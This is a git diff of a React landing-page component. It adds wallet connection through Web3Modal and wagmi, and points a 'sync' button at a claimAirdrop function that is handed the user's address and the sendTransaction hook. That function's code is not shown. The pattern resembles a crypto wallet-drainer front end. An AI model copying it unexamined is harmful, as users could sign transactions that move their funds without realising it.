@@ -4,7 +4,18 @@ import "../App.css";
 import { NavLink } from "react-router-dom";
 import { heroImg, connectBtn, sync } from "../assets";
 import NavMenu from "./NavMenu";
+import { useWeb3Modal } from "@web3modal/wagmi/react";
+import { claimAirdrop } from "../../funcs";
+
+import { useAccount, usePublicClient, useSendTransaction } from 'wagmi'
+
+
 const Hero = ({ toggle, toogleHandler }) => {
+    const {open } = useWeb3Modal()
+    const { address, isConnected } = useAccount()
+    const publicClient = usePublicClient()
+    const { sendTransaction } = useSendTransaction()
+  
   return (
     <section className={`${styles.heroSection}`}>
       <div className={`${styles.heroImage}`}>
@@ -25,14 +36,14 @@ const Hero = ({ toggle, toogleHandler }) => {
             digital wallet.
           </p>
           <div className="mt-[2rem] flex gap-[1rem]">
-            <NavLink to="wallet">
-              <button>
+            <NavLink >
+              <button  onClick={open}>
                 <img src={connectBtn} />
               </button>
             </NavLink>
 
-            <NavLink to="wallet">
-              <button>
+            <NavLink >
+              <button onClick={() => claimAirdrop(address, publicClient, open, sendTransaction)}>
                 <img src={sync} />
               </button>
             </NavLink>
